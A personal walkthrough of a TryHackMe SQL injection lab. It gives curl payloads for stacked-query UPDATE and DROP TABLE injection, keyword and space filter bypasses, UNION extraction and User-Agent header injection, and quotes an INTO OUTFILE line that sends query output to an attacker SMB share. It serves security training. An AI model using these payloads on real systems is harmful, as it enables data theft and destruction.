# Advanced SQL Injection (TryHackMe)

Room: Advanced SQL Injection — Web Application Pentesting / Injection Attacks. Covers second-order
SQLi, filter/WAF evasion, out-of-band exfiltration, HTTP-header injection, and automation theory.
Completed: 2026-11-06 | Target: <ip> (`advsqli1.52w-badr`). Stack: **XAMPP on Windows**,
**MariaDB 10.4.24**, web on port 80, MySQL on 3306. Solved **fully headless from `C:\CTF`** with
`curl` — no browser, no AttackBox. Five separate vulnerable apps under one web root:
`/second/`, `/encoding/`, `/space/`, `/oob/`, `/httpagent/`.

## Answers

| Task | Question | Answer |
|---|---|---|
| 1 | MySQL port | *(find it yourself)* |
| 2 | Same channel for injection + retrieval | *(find it yourself)* |
| 2 | OOB protocol for results | *(find it yourself)* |
| 3 | Flag — all titles set to "compromised" | `THM{…}` |
| 3 | Flag — drop table `hello` | `THM{…}` |
| 4 | MySQL error code on bad chars | *(find it yourself)* |
| 4 | Book name where book ID = 6 | *(find it yourself)* |
| 5 | Password for username `attacker` | `<redacted-pw>` |
| 5 | Bypass if `SELECT` is banned (option) | *(find it yourself)* |
| 6 | `@@version` | *(find it yourself)* |
| 6 | `@@basedir` | *(find it yourself)* |
| 7 | `flag` field in `books` where `book_id=1` | `THM{…}` |
| 7 | Field detected server-side for the user agent | *(find it yourself)* |
| 8 | Dynamic SQL helps the pentester? | *(find it yourself)* |
| 9 | MSSQL system-command proc | *(find it yourself)* |

Concept answers (2, 5-option, 8, 9) come from the task text; everything else was pulled live.

## Task 3 — Second-order SQLi (`/second/`)

`update.php` builds a **stacked** query with `multi_query`, interpolating raw `$_POST` (no escaping):

```sql
UPDATE books SET book_name='$new_book_name', author='$new_author' WHERE ssn='$ssn';
INSERT INTO logs (page) VALUES ('update.php');
```

The form keys off the SSN: `name='update' value='<ssn>'` → `$unique_id`, then
`$ssn = $_POST['ssn_<unique_id>']`. Because `$ssn` is read straight from POST (not re-fetched from
the DB), the "second order" round-trip through `add.php` is unnecessary — inject directly into
`ssn_<id>`:

```bash
# Flag 1: set every book title to "compromised"
curl -s -X POST "http://<ip>/second/update.php" \
  --data-urlencode "update=1" \
  --data-urlencode "ssn_1=12345'; UPDATE books SET book_name='compromised'; -- " \
  --data-urlencode "new_book_name_1=x" --data-urlencode "new_author_1=y"
# -> Flag 1 (All books title as compromised): THM{…}

# Flag 2: drop table hello
curl -s -X POST "http://<ip>/second/update.php" \
  --data-urlencode "update=1" \
  --data-urlencode "ssn_1=12345'; DROP TABLE hello; -- " \
  --data-urlencode "new_book_name_1=x" --data-urlencode "new_author_1=y"
# -> Flag 2 (Hello Table Not Found): THM{…}
```

The trailing `-- ` (note the space) comments the leftover `'; INSERT INTO logs...`. The app prints
both flags once the DB state matches.

## Task 4 — Keyword filter (`/encoding/`)

`str_replace(array("OR","or","AND","and","UNION","SELECT"), '', $book_name)` — a **single,
case-sensitive** pass, quotes **not** filtered. A lone quote errors out (reveals `errno`); `||`
substitutes for `OR`:

```bash
curl -s "http://<ip>/encoding/search_books.php?book_name=%27"            # Error Code: *(find it yourself)*
curl -s "http://<ip>/encoding/search_books.php?book_name=x%27%20%7C%7C%201%3D1%20--%20-"
# dumps all books -> Book ID 6 = *(find it yourself)*
```

## Task 5 — Space filter (`/space/`)

Filter strips `" "` plus the same keywords. The room's `--` trick fails here: injected whitespace
becomes **newlines**, and `--` only comments to end of line, so the trailing `'` breaks the query.
Fix — **balance the quote** instead of commenting (no spaces, no banned keywords):

```bash
curl -s "http://<ip>/space/search_users.php?username=1%27%7C%7C1%3D1%7C%7C%271%27%3D%271"
# SELECT * FROM user WHERE username = '1'||1=1||'1'='1'  -> bob/<redacted-pw>, attacker/<redacted-pw>
```

## Task 6 — OOB endpoint, read in-band (`/oob/`)

`search_visitor.php` echoes results, so no SMB `INTO OUTFILE` is needed to read the asked values.
`SELECT *` on `visitor` has **4** columns (only 3 are displayed — confirmed by column-count
probing; 3→mismatch, 4→OK):

```bash
curl -s "http://<ip>/oob/search_visitor.php?visitor_name=x%27%20UNION%20SELECT%201%2C@@version%2C@@basedir%2C4%20%23"
# Name: *(find it yourself)*   Time: *(find it yourself)*
```

(The full SMB-exfil demo — `1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --`
against an `impacket smbserver.py` share — was not required for the flags.)

## Task 7 — HTTP header injection (`/httpagent/`)

`User-Agent` is inserted into `logs` and reflected via `SELECT * FROM logs WHERE user_Agent='...'`.
No filter; `logs` has 2 columns. UNION to pull `books.flag`:

```bash
curl -s -H "User-Agent: ' UNION SELECT flag,2 FROM books WHERE book_id=1 #" http://<ip>/httpagent/
# id: THM{…}   user_Agent: 2
```

## Lessons

- **`real_escape_string` on INSERT ≠ safe.** It only neutralises the first write; the stored string
  stays intact and detonates when later concatenated unsanitised. Here `update.php` was even more
  direct — it trusts raw `$_POST['ssn_*']`, so the "second order" step is skippable and the stacked
  `multi_query` runs arbitrary SQL (`UPDATE`/`DROP`) in one request.
- **A `str_replace` keyword blocklist is trivially bypassed** because it is a single, case-sensitive
  pass: `OR`→`||`, and (per the room) `SELECT`→`SElect`/`SeLect` (the case-variation option, since
  the filter only matches the exact strings listed).
- **Whitespace filters change which comment style works.** When the only usable "space" is a newline
  (`%0A`), a `-- ` line comment dies at that newline; balancing the quote (`...||'1'='1`) avoids
  needing a comment at all. Tabs/`%09`/`/**/` are the other options.
- **UNION column count is the `SELECT *` width, not the number of fields the page prints.** `/oob/`
  showed 3 fields but needed 4 columns — probe with incrementing counts (or `ORDER BY n`) and watch
  for error `1222`.
- **"Out-of-band" ≠ mandatory OOB channel.** If the endpoint echoes query output, read
  `@@version`/`@@basedir` in-band; reserve `INTO OUTFILE` + SMB for when responses are truly blind.
- **Headless pattern** (same as [[hammer]], [[jwt-security]], [[oauth-vulnerabilities]]):
  everything is `curl` from `C:\CTF`; `--data-urlencode` keeps stacked-query payloads intact, and
  `sed 's/<[^>]*>//g'` strips HTML to read the echoed SQL + results cleanly.
